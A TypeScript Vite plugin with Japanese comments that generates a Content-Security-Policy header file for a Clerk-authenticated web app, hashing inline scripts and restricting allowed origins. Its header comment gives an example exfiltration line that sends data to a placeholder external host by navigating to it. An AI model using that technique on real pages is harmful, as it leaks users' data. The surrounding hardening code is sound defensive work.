/**
 * 本番の Web (Workers Static Assets) が返す Content-Security-Policy を、 build のたびに
 * `dist/_headers` へ書き出す。
 *
 * 目的は、 XSS を起こしにくくし、 起きたときの持ち出しの経路を減らすこと。 本番は Clerk でログインし、
 * 画面は Clerk の SDK が持つ短い (約 60 秒) セッショントークンで API を呼ぶ (localStorage に置くのは
 * ローカル開発の dev-token だけ)。 XSS は利用者になりすました API 呼び出しやデータの持ち出しにつながる
 * ので、 次を守る:
 * - script-src に 'unsafe-inline' を入れない。 差し込まれた inline script・イベント属性・外部 script は
 *   動かない。 index.html の inline script (テーマの初期適用) は、 書き出し済みの HTML から sha256 を
 *   取って個別に許す (文面を直しても許可が追随する)。
 * - fetch・画像・メディアの宛先 (connect-src / img-src / media-src) を、 自分・API・教材 (R2)・Clerk に絞る。
 * - 他サイトへの埋め込み (frame-ancestors) を禁じる。
 *
 * これは持ち出しを防ぐ保証ではない。 スクリプトが動いてしまえば、 トップレベルの画面遷移
 * (`location.href = "https://外部/?d=" + data`) や `window.open` で読めたデータを URL に載せて外へ出せ、
 * CSP はこれを止められない (遷移を縛る directive は無い。 form-action はフォーム送信だけ)。
 *
 * 本番の API は Web の Worker が同じオリジンの `/api/*` で中継するので、 `VITE_SERVER_URL` は Web 自身の
 * オリジンになる ('self' と重なるだけで害は無い)。
 *
 * API と教材のオリジンは画面と同じ `VITE_SERVER_URL` / `VITE_MATERIALS_BASE_URL` から取るので、
 * 宛先を変えたら build し直せば CSP も揃う。 dev サーバー (`vite dev`) には付かない — `_headers` は
 * Workers Static Assets が配信時に読むファイル。
 */
import { createHash } from "node:crypto";
import { writeFileSync } from "node:fs";
import path from "node:path";
import type { Plugin } from "vite";

/** Google ログインで取ったプロフィール画像 (`profiles.avatar_url`) の配信元。 */
const GOOGLE_AVATAR_HOSTS = "https://*.googleusercontent.com";
/** index.html の Google Fonts。 CSS と、 そこから読むフォント本体で配信元が違う。 */
const GOOGLE_FONTS_CSS = "https://fonts.googleapis.com";
const GOOGLE_FONTS_FILES = "https://fonts.gstatic.com";
/** Clerk の利用者の画像 (Google のアカウントの画像を Clerk が配信する)。 */
const CLERK_IMAGES = "https://img.clerk.com";
/** Clerk のボット対策 (Cloudflare Turnstile)。 初めてのログイン (サインアップ) で出ることがある。 */
const TURNSTILE = "https://challenges.cloudflare.com";

/**
 * Clerk の公開鍵 (`pk_test_<base64(Frontend API のホスト名 + "$")>`) から Frontend API のオリジンを取る。
 * 画面はここへ直接ログインの入力を送る。 読めなければ null。
 */
export function clerkFrontendApiOrigin(publishableKey: string | undefined): string | null {
  const match = /^pk_(?:test|live)_([A-Za-z0-9+/=_-]+)$/.exec(publishableKey?.trim() ?? "");
  if (!match?.[1]) return null;
  try {
    const decoded = Buffer.from(match[1], "base64").toString("utf8");
    const host = decoded.replace(/\$$/, "");
    if (!/^[a-z0-9-]+(\.[a-z0-9-]+)+$/i.test(host)) return null;
    return `https://${host.toLowerCase()}`;
  } catch {
    return null;
  }
}

export interface CspInput {
  /** `VITE_SERVER_URL` (API)。 未設定ならデモ (fixture) 経路で、 API へは通信しない。 */
  serverUrl?: string;
  /** `VITE_MATERIALS_BASE_URL` (教材の公開 R2)。 */
  materialsBaseUrl?: string;
  /** `VITE_CLERK_PUBLISHABLE_KEY`。 未設定なら Clerk へは通信しない (ローカルの dev-token)。 */
  clerkPublishableKey?: string;
  /** index.html にある inline script の本文。 */
  inlineScripts: readonly string[];
}

/** URL からオリジンだけを取る。 空・不正な値は null (CSP に紛れ込ませない)。 */
export function originOf(url: string | undefined): string | null {
  const trimmed = url?.trim();
  if (!trimmed) return null;
  try {
    const { origin, protocol } = new URL(trimmed);
    if (protocol !== "https:" && protocol !== "http:") return null;
    return origin;
  } catch {
    return null;
  }
}

/** HTML から src の無い `<script>` の本文を取り出す (CSP のハッシュは本文のバイト列に対して取る)。 */
export function inlineScriptsOf(html: string): string[] {
  const scripts: string[] = [];
  for (const match of html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)) {
    const attributes = match[1] ?? "";
    const body = match[2] ?? "";
    if (/\ssrc\s*=/i.test(attributes)) continue;
    scripts.push(body);
  }
  return scripts;
}

function sha256Source(script: string): string {
  return `'sha256-${createHash("sha256").update(script, "utf8").digest("base64")}'`;
}

export function buildContentSecurityPolicy(input: CspInput): string {
  const remote = [...new Set([originOf(input.serverUrl), originOf(input.materialsBaseUrl)])].filter(
    (origin): origin is string => origin !== null,
  );
  const clerkApi = clerkFrontendApiOrigin(input.clerkPublishableKey);
  const clerk = clerkApi ? [clerkApi] : [];
  const directives: [string, ...string[]][] = [
    ["default-src", "'self'"],
    [
      "script-src",
      "'self'",
      // sql.js と QuickJS (課題のプレビュー採点) の WASM。
      "'wasm-unsafe-eval'",
      // CMS の課題エディタが使うブラウザ版 ESLint は、 ルール設定の検証 (ajv) で `new Function` を
      // 呼ぶ。 外すと管理者のプレビュー採点が動かない。 inline script・外部 script・
      // `javascript:` は引き続き止まる。 ESLint を Worker に移せば外せる。
      "'unsafe-eval'",
      ...input.inlineScripts.map(sha256Source),
      // Clerk のボット対策 (Turnstile) の script。 Clerk の SDK 自体は bundle に含め (no-rhc)、外から読まない。
      ...(clerkApi ? [TURNSTILE] : []),
    ],
    // CodeMirror・sonner・xterm が実行時に <style> を差し込むので 'unsafe-inline' が要る。
    ["style-src", "'self'", "'unsafe-inline'", GOOGLE_FONTS_CSS],
    ["font-src", "'self'", "data:", GOOGLE_FONTS_FILES],
    // blob: はスキルツリーの講座アイコン (API から取った SVG を blob URL で mask-image に渡す)。
    [
      "img-src",
      "'self'",
      "data:",
      "blob:",
      ...remote,
      GOOGLE_AVATAR_HOSTS,
      ...(clerkApi ? [CLERK_IMAGES] : []),
    ],
    // blob: は面談対策の読み上げ・録音の再生。 教材の動画は R2 から直接読む。
    ["media-src", "'self'", "blob:", ...remote],
    // fetch / XHR / WebSocket / sendBeacon の宛先。 画面遷移 (location・window.open) は縛れない。
    ["connect-src", "'self'", ...remote, ...clerk],
    // blob: は Clerk の SDK がセッションの更新に使う Web Worker。
    ["worker-src", "'self'", ...(clerkApi ? ["blob:"] : [])],
    ...(clerkApi ? ([["frame-src", TURNSTILE]] as [string, ...string[]][]) : []),
    ["object-src", "'none'"],
    ["base-uri", "'self'"],
    ["form-action", "'self'"],
    ["frame-ancestors", "'none'"],
  ];
  return directives.map((parts) => parts.join(" ")).join("; ");
}

/** Workers Static Assets の `_headers` 形式。 全パス (SPA の fallback を含む) に付ける。 */
export function headersFile(csp: string): string {
  return `/*\n  Content-Security-Policy: ${csp}\n`;
}

export function securityHeaders(): Plugin {
  let env: Record<string, string> = {};
  return {
    name: "security-headers",
    apply: "build",
    configResolved(config) {
      env = config.env as Record<string, string>;
    },
    writeBundle(output, bundle) {
      const html = bundle["index.html"];
      if (html?.type !== "asset" || !output.dir) {
        throw new Error("[security-headers] index.html が成果物に無いため CSP を書き出せません");
      }
      const csp = buildContentSecurityPolicy({
        serverUrl: env.VITE_SERVER_URL,
        materialsBaseUrl: env.VITE_MATERIALS_BASE_URL,
        clerkPublishableKey: env.VITE_CLERK_PUBLISHABLE_KEY,
        inlineScripts: inlineScriptsOf(String(html.source)),
      });
      writeFileSync(path.join(output.dir, "_headers"), headersFile(csp));
    },
  };
}
